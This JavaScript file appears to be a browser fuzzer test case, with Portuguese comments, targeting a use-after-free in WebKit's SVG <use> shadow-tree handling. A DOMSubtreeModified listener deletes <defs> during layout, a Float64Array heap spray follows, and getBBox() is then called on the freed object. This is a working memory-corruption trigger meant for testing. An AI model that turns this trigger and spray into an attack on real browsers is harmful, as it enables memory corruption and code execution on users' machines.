'use strict';
/**
 * Teste 9 — WebCore: SVG <use> Shadow Tree Destruction UAF
 *
 * Foco: Interações re-entrantes entre o DOM do SVG e o RenderTree.
 * Alterar a referência de um <use> de forma síncrona enquanto o layout
 * (getBBox) é calculado destrói o RenderSVGModelObject original.
 */
(function (global) {
  global.FuzzerTests = global.FuzzerTests || {};

  global.FuzzerTests['9'] = {
    id      : 9,
    name    : 'WebCore.SVG — <use> element shadow tree destruction',
    category: 'WebCore-SVG-UAF',
    timeout : 5000,

    run: function () {
      var anomalies = [];
      var sandbox = document.createElement('div');
      sandbox.id = 'fuzzer-sandbox-9';
      document.body.appendChild(sandbox);

      (function variantA() {
        try {
          sandbox.innerHTML = 
            '<svg id="svg-root">' +
            '  <defs><rect id="target" width="10" height="10" fill="red"/></defs>' +
            '  <use id="use-el" href="#target" />' +
            '</svg>';

          var svg = document.getElementById('svg-root');
          var useEl = document.getElementById('use-el');
          var target = document.getElementById('target');
          
          var bypass = 0;
          
          /* Usamos um evento síncrono para interceptar a modificação */
          svg.addEventListener('DOMSubtreeModified', function(e) {
            bypass++;
            if (bypass === 1) {
              /* Removemos as definições, destruindo o Shadow DOM do <use> */
              svg.removeChild(svg.querySelector('defs'));
              
              /* Force GC imediato / Spray */
              var spray = [];
              for (var i = 0; i < 500; i++) {
                var f64 = new Float64Array(1024);
                f64.fill(1.11111);
                spray.push(f64);
              }
            }
          });

          /* O gatilho: alteramos um atributo geométrico, forçando layout */
          target.setAttribute('width', '100');

          /* O motor tenta calcular o BBox do <use> que teve sua origem
           * destruída debaixo dos panos durante a re-entrância acima. */
          var bbox = useEl.getBBox();

          if (bbox && isNaN(bbox.width)) {
             anomalies.push('A: getBBox() retornou NaN em objeto parcialmente liberado');
          }

        } catch (e) {
          /* NotFoundError é aceitável, type errors não. */
          if (e.name !== 'NotFoundError' && e.name !== 'InvalidStateError') {
             anomalies.push('A: Exceção inesperada: ' + String(e));
          }
        }
      }());

      document.body.removeChild(sandbox);

      if (anomalies.length > 0) return { status: 'ANOMALY', detail: anomalies.join(' | ') };
      return { status: 'PASS', detail: 'SVG RenderTree recalculo validado' };
    }
  };

}(window));
